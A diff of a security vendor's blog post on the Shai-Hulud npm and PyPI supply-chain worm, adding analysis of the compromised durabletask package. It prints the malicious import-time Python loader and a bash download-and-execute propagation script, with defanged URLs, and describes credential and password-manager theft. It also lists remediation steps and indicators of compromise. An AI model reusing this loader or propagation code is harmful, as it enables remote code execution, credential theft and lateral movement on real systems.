@@ -1,12 +1,12 @@
 ---
-excerpt: "JFrog Security Research analyzed the May 19 Shai-Hulud wave in the npm ecosystem, where compromised packages used install-time execution, encrypted credential theft, GitHub dead-drop exfiltration, AI-tool persistence, npm OIDC abuse, and an evolved dead-man switch."
+excerpt: "JFrog Security Research analyzed the May 19 Shai-Hulud wave across npm and PyPI, where compromised packages used install-time and import-time execution, encrypted credential theft, GitHub dead-drop exfiltration, AI-tool persistence, npm OIDC abuse, lateral movement through AWS SSM and Kubernetes, and an evolved dead-man switch."
 title: "Shai-Hulud Returns: npm Worm hits @antv in latest ongoing campaign"
 date: "May 19, 2026"
 description: "Guy Korolevski, JFrog Security Researcher"
 tag: "Real Time Post"
 img: /img/RealTimePostImage/post/shai-hulud-here-we-go-again-may19/image1.jpg
 type: realTimePost
-minutes: '11'
+minutes: '14'
 ---
 
 
@@ -14,11 +14,13 @@ minutes: '11'
 
 **Update, May 19, 2026:** Following initial publication, JFrog Security Research identified an additional compromised package, `@cap-js/openapi` 1.4.1, carrying a closely related Shai-Hulud payload variant that uses a distinct indirect delivery technique. See [A Related Variant: @cap-js/openapi](#a-related-variant-cap-jsopenapi) below.
 
-JFrog Security Research analyzed a new **Shai-Hulud: Here We Go Again** wave affecting the npm ecosystem on May 19, 2026\. The campaign compromised hundreds of package versions around the `@antv` ecosystem and related packages, using malicious install-time execution to steal credentials from developer machines, CI/CD runners, cloud environments, and local developer tooling.
+**Second update, May 19, 2026:** JFrog Security Research also identified compromised PyPI package `durabletask` versions 1.4.1, 1.4.2, and 1.4.3. The package uses an import-time Linux loader to fetch `rope.pyz`, a direct evolution of the Python `transformers.pyz` payload analyzed in our previous post, but adds lateral movement through AWS Systems Manager and Kubernetes. See [PyPI Payload: durabletask Import-Time Loader](#pypi-payload-durabletask-import-time-loader) below.
 
-This was a compromise of 323 legitimate packages, not a fake-package campaign. The npm maintainer account `atool` (`i@hust.cc`), which owns 547 packages including the `@antv` data visualization suite, was compromised through stolen publishing credentials. A second maintainer account, `prop`, was also compromised and published six packages as part of the same campaign.
+JFrog Security Research analyzed a new **Shai-Hulud: Here We Go Again** wave affecting the npm ecosystem on May 19, 2026, with a related PyPI compromise identified during follow-up analysis. The campaign compromised hundreds of package versions around the `@antv` ecosystem and related packages, using malicious install-time execution to steal credentials from developer machines, CI/CD runners, cloud environments, and local developer tooling.
 
-This post follows JFrog's previous analysis of [Shai-Hulud: Here We Go Again](https://research.jfrog.com/post/shai-hulud-here-we-go-again/). The earlier wave already showed worm-like npm propagation, GitHub dead-drop exfiltration, and a destructive token monitor. The May 19 wave keeps those core behaviors, but changes the delivery path, adds a smaller Bun-based payload, expands persistence through AI-tool hooks, and introduces an additional GitHub commit-search C2 daemon that can survive token rotation.
+This was initially a compromise of 323, now 325 legitimate npm packages, not a fake-package campaign. The npm maintainer account `atool` (`i@hust.cc`), which owns 547 packages including the `@antv` data visualization suite, was compromised through stolen publishing credentials. A second maintainer account, `prop`, was also compromised and published six packages as part of the same campaign. The later PyPI finding shows the same campaign family also reaching Python users through the legitimate `durabletask` package.
+
+This post follows JFrog's previous analysis of [Shai-Hulud: Here We Go Again](https://research.jfrog.com/post/shai-hulud-here-we-go-again/). The earlier wave already showed worm-like npm propagation, PyPI import-time payload delivery, GitHub dead-drop exfiltration, and a destructive token monitor. The May 19 wave keeps those core behaviors, but changes the npm delivery path, adds a smaller Bun-based payload, expands persistence through AI-tool hooks, introduces an additional GitHub commit-search C2 daemon that can survive token rotation, and evolves the PyPI payload with lateral movement through cloud and Kubernetes control planes.
 
 ## Install-Time Delivery Through npm
 
@@ -104,6 +106,62 @@ In GitHub Actions environments, the payload can commit malicious files back to a
 
 The worm propagation path is also present. The payload includes logic to request an npm OIDC token using `ACTIONS_ID_TOKEN_REQUEST_TOKEN` and `ACTIONS_ID_TOKEN_REQUEST_URL`, exchange it at the npm registry endpoint, modify package tarballs, and republish infected versions. This allows a compromised CI environment to become a publishing point for additional compromised packages.
 
+## PyPI Payload: `durabletask` Import-Time Loader
+
+After analyzing the npm wave, we identified a related PyPI compromise affecting the legitimate package `durabletask`. Versions 1.4.1, 1.4.2, and 1.4.3 had a Linux-only downloader appended to the package's `__init__.py`. Unlike the npm packages, which rely on lifecycle scripts, this payload can execute when Python code imports `durabletask`.
+
+```python
+if platform.system() == "Linux":
+    try:
+        urllib.request.urlretrieve("hxxps[:]//check.git-service[.]com/rope.pyz", "/tmp/managed.pyz")
+        with open(os.devnull, "w") as f:
+            subprocess.Popen(
+                ["python3", "/tmp/managed.pyz"],
+                stdout=f,
+                stderr=f,
+                stdin=f,
+                start_new_session=True,
+            )
+    except:
+        pass
+```
+
+The loader silently downloads `rope.pyz` or `managed.pyz` (depends on the version) from `check.git-service[.]com`, writes it to `/tmp/managed.pyz`, and starts it as a detached Python process with all standard streams redirected to `/dev/null`. The Linux guard mirrors the targeting gate inside the downloaded payload, reducing noise on non-target systems.
+
+The downloaded Python application is not a new family. **It is a direct evolution** of the `transformers.pyz` payload described in our previous analysis of [Shai-Hulud: Here We Go Again](https://research.jfrog.com/post/shai-hulud-here-we-go-again/). Several core files are **byte-for-byte identical**, including `__main__.py`, `aggregate.py`, `entrypoint.py`, `roulette.py`, `collectors/filesystem.py`, `collectors/gcp.py`, `collectors/azure.py`, `collectors/vault.py`, and `utilities/crypto.py`. For the shared anti-analysis checks, credential collectors, encrypted exfiltration chain, GitHub fallback, and geofenced destructive behavior, refer to the previous post. The important change in the `durabletask` payload is that the same stealer now includes active lateral movement and stronger password-manager access attempts.
+
+### Lateral Movement Through AWS SSM
+
+The AWS collector still gathers AWS secrets and SSM parameters, but now also enumerates EC2 instances managed by AWS Systems Manager across 19 regions using `DescribeInstanceInformation`. For each discovered instance, it records identifiers and status fields such as `InstanceId`, `PingStatus`, `PlatformType`, `ComputerName`, and `IPAddress`.
+
+When SSM-managed instances are found, the payload attempts to propagate to up to five online, non-Windows targets. It resolves AWS credentials from the environment or EC2 IMDS, skips systems already marked with `~/.cache/.sys-update-check`, and sends an `AWS-RunShellScript` command that downloads and runs the same Python zip payload:
+
+```bash
+[ -f "$HOME/.cache/.sys-update-check" ] && exit 0
+PAYLOAD_FILE="rope-${RANDOM}.pyz"
+curl -sSL "hxxps[:]//check.git-service[.]com/rope.pyz" -o "$PAYLOAD_FILE" \
+  || curl -sSL "hxxps[:]//t[.]m-kosche[.]com/rope.pyz" -o "$PAYLOAD_FILE"
+nohup python3 "$PAYLOAD_FILE" > /dev/null 2>&1 &
+```
+
+The propagation state is written under `/tmp/.rope_state/ssm_instances.json`, while the per-host marker contains a machine fingerprint derived from host identity files and hostname values. This is a meaningful escalation from the earlier PyPI payload: the malware no longer only steals cloud credentials, it uses them to reach additional machines through legitimate cloud administration channels.
+
+### Lateral Movement Through Kubernetes
+
+The Kubernetes collector was also extended from passive collection to propagation. After extracting Kubernetes secrets, the payload attempts to list running pods across all namespaces with `kubectl get pods --all-namespaces -o json`. It then uses `kubectl exec` against up to five pods, excluding the current pod identified by `$HOSTNAME`, and runs the same download-and-execute script used by the SSM path.
+
+A separate marker, `~/.cache/.sys-update-check-k8s`, prevents repeated Kubernetes propagation from the same environment. This means a compromised Python import inside a pod or developer environment with cluster access can become a launch point into other workloads, provided the available Kubernetes identity has sufficient `exec` permissions.
+
+### Active Password-Manager Unlocking
+
+The earlier Python payload attempted to dump password-manager data when vaults were already unlocked. The `durabletask` payload goes further by attempting to unlock them first. It scrapes candidate passwords from environment variables matching patterns such as `*PASS*`, `*SECRET*`, `*KEY*`, `BW_*`, and `OP_*`, then also searches shell history files including `~/.bash_history`, `~/.zsh_history`, and `~/.history`.
+
+Those candidates, plus the fallback string `anon`, are tried against Bitwarden through `bw unlock <password> --raw`, 1Password through `op signin --raw`, and `pass` or `gopass` through GPG unlock attempts. If an unlock succeeds, the payload proceeds with the same vault-dumping behavior documented in the previous PyPI analysis.
+
+### Infrastructure Changes
+
+The `durabletask` payload also changes the network infrastructure used by the earlier Python stealer. The original PyPI payload used the raw IP `83[.]142[.]209[.]194`, disabled TLS verification, and posted stolen data to `/v1/weights`. The new payload moves to `check.git-service[.]com`, enables TLS verification, posts encrypted results to `/api/public/version`, and keeps `/v1/models` as the roulette endpoint for secondary payload retrieval. Propagation uses `hxxps[:]//check.git-service[.]com/rope.pyz` with `hxxps[:]//t[.]m-kosche[.]com/rope.pyz` as a fallback payload URL.
+
 ## A Related Variant: `@cap-js/openapi`
 
 After initial publication, JFrog Security Research identified `@cap-js/openapi` 1.4.1 as another compromised package in this campaign. `@cap-js/openapi` is a legitimate SAP open-source tool for generating OpenAPI documents from CAP service definitions, with its canonical repository at `github:cap-js/openapi`. The malicious version 1.4.1 introduces a structural change to the delivery mechanism not seen in the main wave: the package itself contains no malicious code at all. Instead, the payload is delivered entirely through an `optionalDependencies` entry:
@@ -136,32 +194,48 @@ The full, updated list of relevant packages in this campaign is also available t
 
 ## How can JFrog Xray customers check if they are affected?
 
-Xray customers can check if any of their artifacts is affected by using [Impact Search](https://jfrog.com/help/r/search-artifacts-by-cve-or-component/how-to-search-for-impacted-resources) with the relevant XRAY-IDs (See Appendix A)
+Xray customers can check if any of their artifacts is affected by using [Impact Search](https://jfrog.com/help/r/search-artifacts-by-cve-or-component/how-to-search-for-impacted-resources) with the relevant XRAY-IDs (see Appendix A) and by searching for the PyPI package/version indicators in Appendix B.
 
 ![](/img/RealTimePostImage/post/shai-hulud-here-we-go-again-may19/image4.png)
 
 ## Remediation
 
-- Isolate affected developer machines and CI/CD runners before revoking GitHub tokens. This is the critical first step because token invalidation can trigger the dead-man switch.  
-- Identify affected projects by checking the full list of compromised package names and versions for this wave, then searching lockfiles and package manifests for unexpected `preinstall` entries running `bun run index.js`, Bun added as a production dependency, `optionalDependencies` pointing to `github:antvis/G2#1916faa365f2788b6e193514872d51a242876569`, or `optionalDependencies` pointing to `github:cap-js/openapi#d78c25443ec4a0d7f0a85776461f3b1163132537`.  
-- Remove malicious package versions from affected projects. For npm projects, run `npm uninstall <package name>`, reinstall a verified clean version, and regenerate lockfiles from trusted package metadata.  
-- Stop and disable the Linux `gh-token-monitor` service before credential revocation: `systemctl --user stop gh-token-monitor.service` and `systemctl --user disable gh-token-monitor.service`.  
-- Remove Linux `gh-token-monitor` artifacts: `~/.config/systemd/user/gh-token-monitor.service`, `~/.local/bin/gh-token-monitor.sh`, and `~/.config/gh-token-monitor/`.  
-- Stop and disable the Linux `kitty-monitor` service: `systemctl --user stop kitty-monitor.service` and `systemctl --user disable kitty-monitor.service`.  
-- Remove Linux `kitty-monitor` artifacts: `~/.config/systemd/user/kitty-monitor.service`, `~/.local/share/kitty/cat.py`, and `/var/tmp/.gh_update_state`.  
-- On macOS, unload `gh-token-monitor` with `launchctl bootout "gui/$(id -u)" ~/Library/LaunchAgents/com.user.gh-token-monitor.plist`, then remove `~/Library/LaunchAgents/com.user.gh-token-monitor.plist`, `~/.local/bin/gh-token-monitor.sh`, and `~/.config/gh-token-monitor/`.  
-- On macOS, unload `kitty-monitor` with `launchctl bootout "gui/$(id -u)" ~/Library/LaunchAgents/com.user.kitty-monitor.plist`, then remove `~/Library/LaunchAgents/com.user.kitty-monitor.plist` and `~/.local/share/kitty/cat.py`.  
-- Remove AI-tool persistence artifacts, including `~/.claude/package/index.js`, `~/.codex/package/index.js`, injected `.claude/settings.json` `SessionStart` hooks, `.vscode/tasks.json` `folderOpen` tasks, `.claude/setup.mjs`, and `.vscode/setup.mjs`.  
-- Review GitHub repositories for unexpected workflow files such as `.github/workflows/codeql.yml`, the branch `chore/add-codeql-static-analysis`, commits with message `fix: ci`, suspicious commits authored as `claude@users.noreply.github.com`, and public repositories with the description `niagA oG eW ereH :duluH-iahS`.  
-- **After persistence removal is verified**, rotate GitHub tokens, npm tokens, GitHub Actions secrets, npm trusted-publishing identities, AWS credentials, Kubernetes service account tokens, Vault tokens, SSH keys, Docker credentials, and any secrets present in affected environments.  
-- Audit npm packages that affected identities can publish. Look for unexpected versions published after 01:39 UTC on May 19, unexpected lifecycle scripts, new large root-level JavaScript files, and newly added GitHub-based optional dependencies.  
-- Do not treat valid Sigstore provenance as sufficient proof of legitimacy for packages published during the exposure window. The payload can use a compromised trusted workflow identity to produce valid-looking provenance.  
-- Rebuild affected CI/CD runners from clean images, clear poisoned build caches, and consider using `npm ci --ignore-scripts` in CI where lifecycle scripts are not required.  
-- Block campaign network indicators where possible, but do not rely on network blocking alone because GitHub API access is also used for exfiltration and C2.
+### PyPI Payload Remediation
+
+- Identify Python environments, lockfiles, container images, and build logs that installed `durabletask` versions 1.4.1, 1.4.2, or 1.4.3.
+- Remove the compromised package version with `pip uninstall durabletask`, reinstall a verified clean version if required, and inspect `durabletask/__init__.py` for downloader code referencing `check.git-service[.]com/rope.pyz`.
+- Treat affected Linux hosts as compromised. Remove `/tmp/managed.pyz`, `/tmp/rope-*.pyz`, `~/.cache/.sys-update-check`, `~/.cache/.sys-update-check-k8s`, and `/tmp/.rope_state/ssm_instances.json` where present.
+- Stop and disable `pgsql-monitor.service` if present with `systemctl stop pgsql-monitor.service`, `systemctl disable pgsql-monitor.service`, `systemctl --user stop pgsql-monitor.service`, and `systemctl --user disable pgsql-monitor.service`.
+- Remove PyPI payload persistence artifacts: `~/.config/systemd/user/pgsql-monitor.service`, `/etc/systemd/system/pgsql-monitor.service`, `~/.local/bin/pgmonitor.py`, and `/usr/bin/pgmonitor.py`.
+- Audit AWS CloudTrail and SSM history for suspicious `DescribeInstanceInformation` and `SendCommand` activity using `AWS-RunShellScript`, especially commands that download `rope.pyz`.
+- Audit Kubernetes API logs for unexpected `kubectl exec` or pod `exec` activity across namespaces, especially from identities that should only read secrets or metadata.
+
+### npm Payload Remediation
+
+- Isolate affected developer machines and CI/CD runners before revoking GitHub tokens. This is the critical first step because token invalidation can trigger the npm dead-man switch.
+- Identify affected npm projects by checking Appendix A, then searching lockfiles and package manifests for unexpected `preinstall` entries running `bun run index.js`, Bun added as a production dependency, `optionalDependencies` pointing to `github:antvis/G2#1916faa365f2788b6e193514872d51a242876569`, or `optionalDependencies` pointing to `github:cap-js/openapi#d78c25443ec4a0d7f0a85776461f3b1163132537`.
+- Remove malicious npm package versions with `npm uninstall <package name>`, reinstall verified clean versions, and regenerate lockfiles from trusted package metadata.
+- Stop and disable the Linux `gh-token-monitor` service before credential revocation: `systemctl --user stop gh-token-monitor.service` and `systemctl --user disable gh-token-monitor.service`.
+- Remove Linux `gh-token-monitor` artifacts: `~/.config/systemd/user/gh-token-monitor.service`, `~/.local/bin/gh-token-monitor.sh`, and `~/.config/gh-token-monitor/`.
+- Stop and disable the Linux `kitty-monitor` service: `systemctl --user stop kitty-monitor.service` and `systemctl --user disable kitty-monitor.service`.
+- Remove Linux `kitty-monitor` artifacts: `~/.config/systemd/user/kitty-monitor.service`, `~/.local/share/kitty/cat.py`, and `/var/tmp/.gh_update_state`.
+- On macOS, unload `gh-token-monitor` with `launchctl bootout "gui/$(id -u)" ~/Library/LaunchAgents/com.user.gh-token-monitor.plist`, then remove `~/Library/LaunchAgents/com.user.gh-token-monitor.plist`, `~/.local/bin/gh-token-monitor.sh`, and `~/.config/gh-token-monitor/`.
+- On macOS, unload `kitty-monitor` with `launchctl bootout "gui/$(id -u)" ~/Library/LaunchAgents/com.user.kitty-monitor.plist`, then remove `~/Library/LaunchAgents/com.user.kitty-monitor.plist` and `~/.local/share/kitty/cat.py`.
+- Remove AI-tool persistence artifacts, including `~/.claude/package/index.js`, `~/.codex/package/index.js`, injected `.claude/settings.json` `SessionStart` hooks, `.vscode/tasks.json` `folderOpen` tasks, `.claude/setup.mjs`, and `.vscode/setup.mjs`.
+- Review GitHub repositories for unexpected workflow files such as `.github/workflows/codeql.yml`, the branch `chore/add-codeql-static-analysis`, commits with message `fix: ci`, suspicious commits authored as `claude@users.noreply.github.com`, and public repositories with the description `niagA oG eW ereH :duluH-iahS`.
+
+### General Remediation
+
+- **After persistence removal is verified**, rotate GitHub tokens, npm tokens, PyPI tokens, GitHub Actions secrets, npm trusted-publishing identities, AWS credentials, Kubernetes service account tokens, Vault tokens, SSH keys, Docker credentials, password-manager credentials, and any secrets present in affected environments.
+- Audit npm and PyPI packages that affected identities can publish. Look for unexpected versions published after exposure, unexpected lifecycle scripts, new large payload files, import-time downloaders, and newly added GitHub-based optional dependencies.
+- Do not treat valid Sigstore provenance as sufficient proof of legitimacy for packages published during the exposure window. The payload can use a compromised trusted workflow identity to produce valid-looking provenance.
+- Rebuild affected developer machines, CI/CD runners, containers, and cloud workloads from clean images, and clear poisoned build caches.
+- Consider using `npm ci --ignore-scripts` in CI where lifecycle scripts are not required, and enforce immaturity or quarantine policies for newly published package versions.
+- Block campaign network indicators where possible, but do not rely on network blocking alone because GitHub API access, AWS SSM, and Kubernetes control-plane access are also used for exfiltration, C2, and propagation.
 
 ## Conclusions
 
-The May 19 Shai-Hulud wave is not just another malicious npm package incident. The ongoing waves of Shai-Hulud payloads are still in progress, and we can expect to see more of them in the near future.
+The May 19 Shai-Hulud wave is not just another malicious package incident. The npm payload continues the campaign's install-time credential theft and package propagation model, while the PyPI `durabletask` payload shows the Python branch evolving from a downloader and stealer into a lateral-movement tool for cloud and Kubernetes environments. The ongoing waves of Shai-Hulud payloads are still in progress, and we can expect to see more of them in the near future.
 
 The biggest operational risk is the remediation trap created by the dead-man switch, as in the previous attack. Defenders usually revoke exposed tokens as fast as possible, but in this case GitHub token revocation can trigger destructive local commands if the monitor is still active. The correct order is host isolation, persistence removal, and then credential rotation.
 
@@ -169,32 +243,57 @@ These malicious packages are detected by JFrog Xray and JFrog Curation.
 
 ## IOCs
 
-### Network IOCs
+### PyPI IOCs
 
-- `hxxps[:]//t[.]m-kosche[.]com` \- Attacker's C2  
-- `hxxps[:]//t[.]m-kosche[.]com:443/api/public/otel/v1/traces` \- direct HTTPS C2 endpoint disguised as an OpenTelemetry traces path.  
-- `hxxps[:]//api[.]github[.]com/search/commits?q=firedalazer` \- `kitty-monitor` GitHub commit-search C2 polling.  
-- `hxxps[:]//fulcio[.]sigstore[.]dev/api/v2/signingCert` \- Sigstore certificate issuance endpoint used during provenance generation.  
-- `hxxps[:]//rekor[.]sigstore[.]dev/api/v1/log/entries` \- Rekor transparency log submission endpoint used
+- `durabletask` (PyPI) - versions 1.4.1, 1.4.2, and 1.4.3.
+- `hxxps[:]//check.git-service[.]com/rope.pyz` - primary PyPI payload and propagation payload URL.
+- `hxxps[:]//t[.]m-kosche[.]com/rope.pyz` - fallback PyPI propagation payload URL.
+- `hxxps[:]//check.git-service[.]com/api/public/version` - PyPI encrypted exfiltration endpoint.
+- `hxxps[:]//check.git-service[.]com/v1/models` - PyPI roulette endpoint for secondary payload retrieval.
+- `hxxps[:]//check.git-service[.]com/audio.mp3` - PyPI destructive second-stage media URL.
+- `hxxps[:]//api[.]github[.]com/search/commits?q=FIRESCALE` - PyPI fallback C2 discovery through signed GitHub commit messages.
+- `/tmp/managed.pyz` - downloaded PyPI payload path used by the `durabletask` loader.
+- `/tmp/rope-*.pyz` - temporary propagation payload filename pattern.
+- `~/.cache/.sys-update-check` - AWS SSM propagation marker.
+- `~/.cache/.sys-update-check-k8s` - Kubernetes propagation marker.
+- `/tmp/.rope_state/ssm_instances.json` - AWS SSM discovery and propagation state.
+- `pgsql-monitor.service` - PyPI second-stage persistence service.
+- `~/.config/systemd/user/pgsql-monitor.service` - user-level PyPI persistence service path.
+- `/etc/systemd/system/pgsql-monitor.service` - system-level PyPI persistence service path.
+- `~/.local/bin/pgmonitor.py` - user-level PyPI second-stage persistence payload.
+- `/usr/bin/pgmonitor.py` - system-level PyPI second-stage persistence payload.
+- `PUSH UR T3MPRR` - PyPI GitHub exfiltration repository description.
+- `FIRESCALE` - PyPI fallback C2 keyword used in GitHub commit search.
+- `AWS-RunShellScript` - AWS SSM document used for PyPI lateral movement.
+- `DescribeInstanceInformation` and `SendCommand` - AWS SSM API actions used during PyPI discovery and propagation.
+- `he_IL`, `fa_IR`, `Jerusalem`, `Tel_Aviv`, and `Tehran` - geotargeting markers associated with destructive PyPI behavior.
 
-### Persistence IOCs
+### NPM IOCs
 
-- `~/.config/systemd/user/gh-token-monitor.service` \- Linux user service for the GitHub token dead-man switch.  
-- `~/.local/bin/gh-token-monitor.sh` \- GitHub token monitor script.  
-- `~/.config/gh-token-monitor/` \- GitHub token monitor configuration directory.  
-- `~/Library/LaunchAgents/com.user.gh-token-monitor.plist` \- macOS LaunchAgent for the GitHub token dead-man switch.  
-- `~/.config/systemd/user/kitty-monitor.service` \- Linux user service for the GitHub commit-search C2 daemon.  
-- `~/Library/LaunchAgents/com.user.kitty-monitor.plist` \- macOS LaunchAgent for the GitHub commit-search C2 daemon.  
-- `~/.local/share/kitty/cat.py` \- Python payload used by `kitty-monitor`.  
-- `/var/tmp/.gh_update_state` \- `kitty-monitor` execution state tracking file.  
-- `~/.claude/package/index.js` \- local payload copy used for AI-tool persistence.  
-- `~/.codex/package/index.js` \- local payload copy used for AI-tool persistence.  
-- `niagA oG eW ereH :duluH-iahS` \- reversed GitHub dead-drop repository description.  
-- `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner` \- threat string associated with token invalidation.  
-- `firedalazer` \- GitHub commit-search keyword used by `kitty-monitor` in the main wave.
-- `thebeautifulsnadsoftime`, `thebeautifulmarchoftime` \- GitHub commit-search keywords used by `kitty-monitor` in the `@cap-js/openapi` variant.
-- `github:cap-js/openapi#d78c25443ec4a0d7f0a85776461f3b1163132537` \- attacker-controlled GitHub commit delivering the `@cap-js/openapi` variant payload.
-- `7c24b4d9a8f448832f3752d7f67dcdbf1b7f0f41e10bf633efa175e627144e8b` \- SHA-256 of `index.js` from the `@cap-js/openapi` variant payload (GitHub commit `d78c25443`).
+- See Appendix A for the full npm package and version list.
+- `@cap-js/openapi` (npm) - XRAY-986402 - version 1.4.1.
+- `hxxps[:]//t[.]m-kosche[.]com` - attacker's C2.
+- `hxxps[:]//t[.]m-kosche[.]com:443/api/public/otel/v1/traces` - direct HTTPS C2 endpoint disguised as an OpenTelemetry traces path.
+- `hxxps[:]//api[.]github[.]com/search/commits?q=firedalazer` - `kitty-monitor` GitHub commit-search C2 polling.
+- `hxxps[:]//fulcio[.]sigstore[.]dev/api/v2/signingCert` - Sigstore certificate issuance endpoint used during provenance generation.
+- `hxxps[:]//rekor[.]sigstore[.]dev/api/v1/log/entries` - Rekor transparency log submission endpoint used during provenance generation.
+- `github:antvis/G2#1916faa365f2788b6e193514872d51a242876569` - GitHub optional dependency used by npm payload delivery.
+- `github:cap-js/openapi#d78c25443ec4a0d7f0a85776461f3b1163132537` - attacker-controlled GitHub commit delivering the `@cap-js/openapi` variant payload.
+- `7c24b4d9a8f448832f3752d7f67dcdbf1b7f0f41e10bf633efa175e627144e8b` - SHA-256 of `index.js` from the `@cap-js/openapi` variant payload.
+- `~/.config/systemd/user/gh-token-monitor.service` - Linux user service for the GitHub token dead-man switch.
+- `~/.local/bin/gh-token-monitor.sh` - GitHub token monitor script.
+- `~/.config/gh-token-monitor/` - GitHub token monitor configuration directory.
+- `~/Library/LaunchAgents/com.user.gh-token-monitor.plist` - macOS LaunchAgent for the GitHub token dead-man switch.
+- `~/.config/systemd/user/kitty-monitor.service` - Linux user service for the GitHub commit-search C2 daemon.
+- `~/Library/LaunchAgents/com.user.kitty-monitor.plist` - macOS LaunchAgent for the GitHub commit-search C2 daemon.
+- `~/.local/share/kitty/cat.py` - Python payload used by `kitty-monitor`.
+- `/var/tmp/.gh_update_state` - `kitty-monitor` execution state tracking file.
+- `~/.claude/package/index.js` - local payload copy used for AI-tool persistence.
+- `~/.codex/package/index.js` - local payload copy used for AI-tool persistence.
+- `niagA oG eW ereH :duluH-iahS` - reversed GitHub dead-drop repository description.
+- `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner` - threat string associated with token invalidation.
+- `firedalazer` - GitHub commit-search keyword used by `kitty-monitor` in the main wave.
+- `thebeautifulsnadsoftime`, `thebeautifulmarchoftime` - GitHub commit-search keywords used by `kitty-monitor` in the `@cap-js/openapi` variant.
 
 ## Appendix A: NPM Compromised Package versions
 
@@ -526,3 +625,9 @@ Catalog customers \- see also “Shai-Hulud: Here We Go Again \- May 19” label
 | word-width | XRAY-986085 | 1.1.1,1.2.1 |
 | xmorse | XRAY-986131 | 1.1.0,1.2.0 |
 | @cap-js/openapi | XRAY-986402 | 1.4.1 |
+
+## Appendix B: PyPI Compromised Package Versions
+
+| Package Name | XrayID | Versions |
+| :---- | :---- |
+| durabletask | XRAY-986583 | 1.4.1,1.4.2,1.4.3 |
